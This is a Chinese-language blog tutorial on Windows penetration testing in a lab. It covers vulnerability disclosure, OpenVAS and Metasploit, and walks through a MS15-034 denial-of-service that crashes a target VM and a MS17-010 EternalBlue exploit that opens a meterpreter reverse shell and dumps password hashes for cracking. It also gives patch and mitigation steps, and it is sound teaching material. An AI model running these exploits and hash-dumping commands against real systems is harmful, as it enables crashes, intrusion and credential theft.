@@ -1,0 +1,518 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络安全-Windows渗透测试3 | Nicopilot</title><meta name="author" content="Nicopilot"><meta name="copyright" content="Nicopilot"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="🥧本节讲述漏洞扫描、MSF框架中的常用模块、使用Exploit攻击模块和Auxilary辅助模块、利用MS17-010永恒之蓝漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全-Windows渗透测试3">
+<meta property="og:url" content="https://www.nicopilot.online/posts/winpte3.html">
+<meta property="og:site_name" content="Nicopilot">
+<meta property="og:description" content="🥧本节讲述漏洞扫描、MSF框架中的常用模块、使用Exploit攻击模块和Auxilary辅助模块、利用MS17-010永恒之蓝漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.nicopilot.online/img/cover/net_sec/9_cover.png">
+<meta property="article:published_time" content="2024-05-10T06:01:32.000Z">
+<meta property="article:modified_time" content="2024-05-10T06:01:32.000Z">
+<meta property="article:author" content="Nicopilot">
+<meta property="article:tag" content="Windows渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.nicopilot.online/img/cover/net_sec/9_cover.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://www.nicopilot.online/posts/winpte3.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网络安全-Windows渗透测试3',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-10 14:01:32'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/net_sec/9_cover.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Nicopilot"><span class="site-name">Nicopilot</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网络安全-Windows渗透测试3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-10T06:01:32.000Z" title="发表于 2024-05-10 14:01:32">2024-05-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-10T06:01:32.000Z" title="更新于 2024-05-10 14:01:32">2024-05-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%89/">网络安全（更新ing）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="网络安全-Windows渗透测试3"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Windows渗透测试"><a href="#Windows渗透测试" class="headerlink" title="Windows渗透测试"></a>Windows渗透测试</h1><h2 id="漏洞披露"><a href="#漏洞披露" class="headerlink" title="漏洞披露"></a>漏洞披露</h2><h3 id="微软安全公告"><a href="#微软安全公告" class="headerlink" title="微软安全公告"></a>微软安全公告</h3><p><strong>安全公告都有一个惟一的编号</strong></p>
+<ul>
+<li>其命名规则是：MS年份一补丁序号</li>
+<li>比如MS17-010就表示2017年发布的编号为010的安全公告</li>
+<li>最后安全公告：MS17-023</li>
+</ul>
+<p><strong>每个公告对应微软知识库编号</strong></p>
+<ul>
+<li>比如MS17-010对应的是4013389，通过编号在微软的网站上查找到相应的文章和解决方案</li>
+<li>找到：基于x64的Windows Server2008 R2版本安全更新文件名为：Windows6.1-KB4012212-x64.msi</li>
+</ul>
+<h3 id="微软安全更新指南"><a href="#微软安全更新指南" class="headerlink" title="微软安全更新指南"></a>微软安全更新指南</h3><p><strong>微软安全更新指南</strong></p>
+<ul>
+<li>自2017年2月起，替代安全公告</li>
+<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide">https://msrc.microsoft.com/update-guide</a></li>
+</ul>
+<h3 id="什么是CVE"><a href="#什么是CVE" class="headerlink" title="什么是CVE"></a>什么是CVE</h3><p><strong>CVE（Common Vulnerabilities and Exposures）通用漏洞与披露</strong></p>
+<ul>
+<li>CVE可以理解为是一个漏洞字典，也可以称作信息安全漏洞词典</li>
+<li>CVE是指给每个安全漏洞的确定一个唯一的名称，也叫CVEID 编号</li>
+<li><a target="_blank" rel="noopener" href="http://cve.org/">http://cve.org</a> 收录189732条记录</li>
+</ul>
+<h3 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h3><p><strong>国家信息漏洞共享平台</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li>
+</ul>
+<p><strong>美国国家信息安全漏洞库</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov</a></li>
+</ul>
+<h2 id="漏洞扫描-弱点评估"><a href="#漏洞扫描-弱点评估" class="headerlink" title="漏洞扫描&#x2F;弱点评估"></a>漏洞扫描&#x2F;弱点评估</h2><h3 id="什么是网络探测"><a href="#什么是网络探测" class="headerlink" title="什么是网络探测"></a>什么是网络探测</h3><p><strong>网络探测</strong></p>
+<ul>
+<li>网络探测指对计算机网络或DNS服务器进行扫描，获取有效的地址、活动端口号、主机操作系统类型和安全弱点</li>
+</ul>
+<p><strong>常用工具</strong></p>
+<ul>
+<li>Nmap、NessusOpenVAS、MetasploitFramework</li>
+</ul>
+<h3 id="网络探测的应用"><a href="#网络探测的应用" class="headerlink" title="网络探测的应用"></a>网络探测的应用</h3><p><strong>安全评估</strong></p>
+<ul>
+<li>远程系统安全评估是一种非常重要的安全防护方法</li>
+<li>包括构成网络的路由器、交换机和提供各种应用的服务器以及个人电脑，都存在着相当数量的漏洞</li>
+<li>各种攻击行为正是利用这些漏洞展开的</li>
+</ul>
+<h3 id="什么是OpenVAS"><a href="#什么是OpenVAS" class="headerlink" title="什么是OpenVAS"></a>什么是OpenVAS</h3><p><strong>OpenVAS（Open Vulnerability Assessment Scanner）</strong></p>
+<ul>
+<li>是一个开源的全功能的漏洞扫描评估系统，是Nessus项目分支</li>
+<li>功能包括非认证测试、认证测试、各种互联网和工业协议、大规模扫描的性能调整等漏洞库持续更新</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/greenbone/openvas-scanner/">https://github.com/greenbone/openvas-scanner/</a></li>
+</ul>
+<h3 id="OpenVAS部署"><a href="#OpenVAS部署" class="headerlink" title="OpenVAS部署"></a>OpenVAS部署</h3><p><strong>Kali默认没有安装OpenVAS，在线安装并初始化漏洞列表需要3~5小时</strong></p>
+<ul>
+<li>解压kali2022_vmx.zip</li>
+<li>还原快照至”OpenVAS”</li>
+<li>IP地址：192.168.10.224</li>
+</ul>
+<p><strong>从物理机访问</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://192.168.10.224:9392/">https://192.168.10.224:9392</a></li>
+<li>登录用户名admin密码admin</li>
+</ul>
+<h3 id="执行扫描任务"><a href="#执行扫描任务" class="headerlink" title="执行扫描任务"></a>执行扫描任务</h3><ul>
+<li>第一步：添加扫描端口</li>
+<li>第二步：添加扫描目标</li>
+<li>第三步：执行扫描任务</li>
+<li>第四步：检查扫描结果</li>
+</ul>
+<h2 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h2><h3 id="关于Metasploit-Framework"><a href="#关于Metasploit-Framework" class="headerlink" title="关于Metasploit Framework"></a>关于Metasploit Framework</h3><p><strong>一款开源的安全漏检测工具，简称MSF</strong></p>
+<ul>
+<li>可以收集信息、探测系统漏洞、执行漏洞利用测试等，为渗透测试、攻击编码和漏洞研究提供了一个可靠平台</li>
+<li>集成数千个漏洞利用、辅助测试模块，并保持持续更新</li>
+<li>由著名黑客、安全专家H.D.Moore主导开发</li>
+<li>官方网站：<a target="_blank" rel="noopener" href="https://metasploit.com/">https://metasploit.com</a></li>
+</ul>
+<p><strong>在kali中，通过msfconsole进入控制台</strong></p>
+<h3 id="MSF常用模块"><a href="#MSF常用模块" class="headerlink" title="MSF常用模块"></a>MSF常用模块</h3><p><strong>辅助模块Auxiliary</strong></p>
+<ul>
+<li>不直接在测试者和目标主机之间建立访问</li>
+<li>只负责执行扫描、嗅探、指纹识别、爆破等相关功能以辅助渗透测试</li>
+</ul>
+<p><strong>漏洞利用Exploits</strong></p>
+<ul>
+<li>利用目标系统、应用或者服务中的安全漏洞进行攻击行为</li>
+<li>包括用于破坏系统安全的攻击代码，每个漏洞都有相应的攻击代码</li>
+</ul>
+<p><strong>攻击载荷 Payloads</strong></p>
+<ul>
+<li>一般是一段代码，被渗透攻击模块通过安全漏洞植入目标主机中并运行，主要用来与目标主机之间建立一个稳定的连接。可返回Shell或进行程序注入等操作后</li>
+</ul>
+<p><strong>渗透模块Post</strong></p>
+<ul>
+<li>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等</li>
+</ul>
+<h3 id="MSF核心命令"><a href="#MSF核心命令" class="headerlink" title="MSF核心命令"></a>MSF核心命令</h3><p><strong>执行msfconsole进入控制台以后</strong></p>
+<ul>
+<li>？：获取帮助</li>
+<li>exit：退出MSF控制台</li>
+<li>back：返回上一级</li>
+<li>show：查看模块或相关信息</li>
+<li>search：搜索模块</li>
+<li>use：使用模块</li>
+<li>options：列出当前模块的选项</li>
+<li>set：设置模块选项</li>
+<li>run或exploit：运行当前模块</li>
+</ul>
+<h2 id="CVE-2015-1635漏洞利用"><a href="#CVE-2015-1635漏洞利用" class="headerlink" title="CVE-2015-1635漏洞利用"></a>CVE-2015-1635漏洞利用</h2><h3 id="Windows系统历年高危漏洞"><a href="#Windows系统历年高危漏洞" class="headerlink" title="Windows系统历年高危漏洞"></a>Windows系统历年高危漏洞</h3><ul>
+<li>CVE-2012-0002（MS12-020）RDP漏洞DOS攻击</li>
+<li>CVE-2015-1635（MS15-034）HTTP.SYS漏洞攻击</li>
+<li>CVE-2017-0143（MS17-010）445漏洞永恒之蓝攻击</li>
+<li>CVE-2019-0708  RDP漏洞攻击</li>
+</ul>
+<h3 id="CVE-2015-1635（MS15-034）漏洞"><a href="#CVE-2015-1635（MS15-034）漏洞" class="headerlink" title="CVE-2015-1635（MS15-034）漏洞"></a>CVE-2015-1635（MS15-034）漏洞</h3><p><strong>HTTP.sys RCE漏洞</strong></p>
+<ul>
+<li>漏洞存在于HTTP协议堆栈(HTTP.sys)中，攻击者只要发送恶意http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</li>
+<li>漏洞名称：CVE-2015-1635（允许远程执行代码漏洞）</li>
+<li>漏洞安全公告：MS15-034</li>
+</ul>
+<p><strong>影响系统</strong></p>
+<ul>
+<li>Windows 7&#x2F;8&#x2F;8.1</li>
+<li>Windows Server 2008&#x2F;2008 R2&#x2F;2012&#x2F;2012 R2</li>
+</ul>
+<h3 id="POC脚本检测"><a href="#POC脚本检测" class="headerlink" title="POC脚本检测"></a>POC脚本检测</h3><p><strong>POC脚本检测</strong></p>
+<ul>
+<li>Proof of Concept”观点证明”</li>
+<li>一段验证漏洞的程序，使我们能够确认这个漏洞是真实存在的</li>
+</ul>
+<p><strong>脚本上传</strong></p>
+<ul>
+<li>上传cve-2015-1635.poc到kali系统&#x2F;root目录下</li>
+</ul>
+<h3 id="MS15-034漏洞检测"><a href="#MS15-034漏洞检测" class="headerlink" title="MS15-034漏洞检测"></a>MS15-034漏洞检测</h3><p><strong>第一步：POC脚本检测</strong></p>
+<ul>
+<li>上传cve-2015-1635.poc到kali系统</li>
+<li>修改cve-2015-1635.poc文件中的ipaddr为 windows靶机地址</li>
+<li>使用python执行POC脚本</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@kali</span> <span class="string">~] #  python2  cve-2015-1635.poc          //执行POC验证脚本 </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Audit Started                                 //审计开始 </span></span><br><span class="line"><span class="attr">[!!]</span> <span class="string">Looks VULN                                  //看起来很脆弱(vulnerable) </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：搜索CVE-2015-1635或MS15-034</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search  ms15-034</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Matching</span> <span class="string">Modules</span></span><br><span class="line">================</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   #  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   <span class="attr">-</span>  <span class="string">----                                                  ---------------  ----    -----  -----------</span></span><br><span class="line">   <span class="attr">0</span>  <span class="string">auxiliary/dos/http/ms15_034_ulonglongadd                                //攻击</span></span><br><span class="line">   <span class="attr">1</span>  <span class="string">auxiliary/scanner/http/ms15_034_http_sys_memory_dump                    //扫描   </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步：先使用辅助脚本 use 1，先做扫描</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 1</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Target may be vulnerable...         //目标可能是脆弱的</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第四步：退出扫描脚本 use 1，切换攻击脚本 use 0</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[*]</span> <span class="string">DOS request sent                           //DoS请求已发送</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Scanned 1 of 1 hosts (100% complete)       //扫描1个主机已完成</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Auxiliary module execution completed       //辅助模块执行完成</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>检查目标主机是否蓝屏</strong></p>
+<h3 id="MS15-034-漏洞防御"><a href="#MS15-034-漏洞防御" class="headerlink" title="MS15-034 漏洞防御"></a>MS15-034 漏洞防御</h3><p><strong>第五步：MS15-034漏洞防御-关闭内核缓存</strong></p>
+<ul>
+<li>开始菜单 &#x3D;&gt; IIS管理器 &#x3D;&gt; 自己计算机名 &#x3D;&gt; 网站 &#x3D;&gt; Default Web Site &#x3D;&gt; 输出缓存</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/9.3.1.png" alt="9.3.1"></p>
+<p><strong>第六步：关闭内核缓存后，再次发起漏洞利用</strong></p>
+<ul>
+<li>再次发起漏洞利用，发现Windows靶机安然无恙，不再蓝屏</li>
+</ul>
+<p><strong>第七步：除了关闭内核缓存，也可安装补丁进行漏洞防御</strong></p>
+<ul>
+<li>上传Windows6.1-KB3042553-x64-2008R2.msu到Windows靶机</li>
+<li>安装完补丁后，系统会重启</li>
+</ul>
+<h2 id="CVE-2017-0143漏洞利用"><a href="#CVE-2017-0143漏洞利用" class="headerlink" title="CVE-2017-0143漏洞利用"></a>CVE-2017-0143漏洞利用</h2><h3 id="CVE-2017-0143（MS17-010）漏洞"><a href="#CVE-2017-0143（MS17-010）漏洞" class="headerlink" title="CVE-2017-0143（MS17-010）漏洞"></a>CVE-2017-0143（MS17-010）漏洞</h3><p><strong>漏洞为外界所知源于勒索病毒的爆发，该病毒利用NSA（美国国家安全局）泄露的网络攻击工具永恒之蓝（Eternal Blue）改造而成</strong></p>
+<ul>
+<li>漏洞通过TCP的445和139端口，利用SMB远程代码执行漏洞</li>
+<li>攻击者可以在目标系统上执行任意代码</li>
+</ul>
+<p><strong>影响系统</strong></p>
+<ul>
+<li>Windows7&#x2F;8&#x2F;8.1&#x2F;10</li>
+<li>WindowsServer2008&#x2F;2012&#x2F;2016</li>
+</ul>
+<h3 id="MS17-010漏洞利用"><a href="#MS17-010漏洞利用" class="headerlink" title="MS17-010漏洞利用"></a>MS17-010漏洞利用</h3><p><strong>准备Windows靶机</strong></p>
+<p><strong>第一步：漏洞扫描，使用脚本3进行漏洞扫描</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole -q</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search ms17-010</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   #  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   <span class="attr">-</span>  <span class="string">----                                      ---------------  ----     -----  -----------</span></span><br><span class="line">   <span class="attr">0</span>  <span class="string">exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span></span><br><span class="line">   <span class="attr">1</span>  <span class="string">exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span></span><br><span class="line">   <span class="attr">2</span>  <span class="string">auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span></span><br><span class="line">   <span class="attr">3</span>  <span class="string">auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span></span><br><span class="line">   <span class="attr">4</span>  <span class="string">exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution         </span></span><br><span class="line">   </span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 3</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/smb/smb_ms17_010) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[+]</span> <span class="string">192.168.10.142:445    - Host is likely VULNERABLE to MS17-010!        //容易遭受MS17-010的攻击</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：漏洞利用，建立反弹连接</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0                             //使用攻击脚本</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Using configured payload windows/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(windows/smb/ms17_010_eternalblue) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">......</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//Meterpreter作为攻击载荷使用，以便后渗透操作</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump             //获取用户和密码</span></span><br><span class="line"><span class="attr">Administrator</span>:<span class="string">500:aad3b435b51404eeaad3b435b51404ee:531b3ca954d0e442e64a5815b6794c32:::</span></span><br><span class="line"><span class="attr">Guest</span>:<span class="string">501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">Server</span> <span class="string">username: NT AUTHORITY\SYSTEM   //获取用户信息</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用hashdump命令导出SAM账号数据</strong></p>
+<p><strong>复制冒号分隔的第4段内容，可用于MD5解密</strong></p>
+<ul>
+<li>可以访问 <a target="_blank" rel="noopener" href="https://www.cmd5.com/%E7%A0%B4%E8%A7%A3MD5%E5%BC%B1%E5%AF%86%E7%A0%81">https://www.cmd5.com/破解MD5弱密码</a></li>
